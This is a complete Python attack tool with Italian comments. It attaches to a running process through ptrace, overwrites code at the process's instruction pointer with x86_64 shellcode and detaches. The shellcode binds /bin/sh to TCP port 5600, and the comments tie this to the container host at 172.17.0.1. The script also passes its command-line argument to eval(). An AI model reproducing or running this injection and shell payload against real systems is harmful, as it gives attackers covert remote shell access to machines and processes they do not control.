import ctypes
import os
import sys
import struct
import signal

# codice syscalls definite in <sys/ptrace.h>
PTRACE_TRACEME    = 0
PTRACE_PEEKTEXT   = 1
PTRACE_PEEKDATA   = 2
PTRACE_POKETEXT   = 4
PTRACE_POKEDATA   = 5
PTRACE_CONT       = 7
PTRACE_SINGLESTEP = 9
PTRACE_GETREGS    = 12
PTRACE_SETREGS    = 13
PTRACE_ATTACH     = 16
PTRACE_DETACH     = 17
PTRACE_SYSCALL    = 24
PTRACE_PEEKUSER   = 32


# mappatura registri dell'architettura x86_64 (struttura definita in <sys/user.h>)
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

registers=user_regs_struct()


#definisco la primitiva ptrace
libc = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
ptrace = libc.ptrace
ptrace.argtypes = [ctypes.c_int,ctypes.c_int,ctypes.c_void_p,ctypes.c_void_p]
ptrace.restype = ctypes.c_int


#apri socket sull'host, sulla network del container, all'indirizzo 172.17.0.1 : 5600/tcp
shellcode=b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"



def pad_shellcode(ELF_code):
    while len(ELF_code) % 4 != 0 :
        ELF_code += b"\x00"
    return ELF_code    
   

def check_args():
    
    if len(sys.argv) != 2 or not isinstance(eval(sys.argv[1]),int):
        raise Exception("inserire PID target in input")

    return eval(sys.argv[1])



def attach(pid):

    if ptrace(PTRACE_ATTACH, pid, None, None) < 0 :
        raise Exception("PTRACE_ATTACH failed")
    

    print("attaccato? atteso SIGSTOP ... ")
    stat = os.waitpid(pid,0)
    if os.WIFSTOPPED(stat[1]):
        stopSignal = os.WSTOPSIG(stat[1])
        print("ok! ricevuto {} da {}".format(signal.Signals(stopSignal).name,stat[0]))
    


    
def get_registers(pid):
    if ptrace(PTRACE_GETREGS, pid, None,  ctypes.byref(registers)) < 0 :
        raise Exception("PTRACE_GETREGS failed")



def injection(pid):

    for i in range(0,len(shellcode),4):
        #scrive una word per volta (4 byte) rispettando la codifica dell'architettura (qui nello specifico, è litte endian) 
        lil_end_word = struct.unpack("<I",shellcode[i:4+i])[0]
        if ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),lil_end_word) < 0 :
            raise Exception("PTRACE_POKETEXT failed")


    #registers.rip += 2  # 2 sarebbe la dimensione del opcode di SYSCALL su x86
    #se il codice dà core dump può essere un bug di PTRACE_DETACH: prova ad aggiustare il rip register per puntare alla prossima istruzione



def set_registers(pid):
    if ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers)) < 0:
              raise Exception("PTRACE_SETREGS failed") 


def detach(pid):
    if ptrace(PTRACE_DETACH, pid, None, None) < 0 :
        raise Exception("PTRACE_DETACH failed") 
    

if __name__ == "__main__":
    
    shellcode = pad_shellcode(shellcode)
    print("esteso shellcode a {} bytes".format(len(shellcode)))
    try:
        pid = check_args()
        attach(pid)
        get_registers(pid)
        injection(pid)
        set_registers(pid)
        detach(pid)
        print("[v] injection completata (aperta porta a 172.17.0.1:5600/tcp )")
    except Exception as e:
        print("[x]"+str(e), file=sys.stderr)













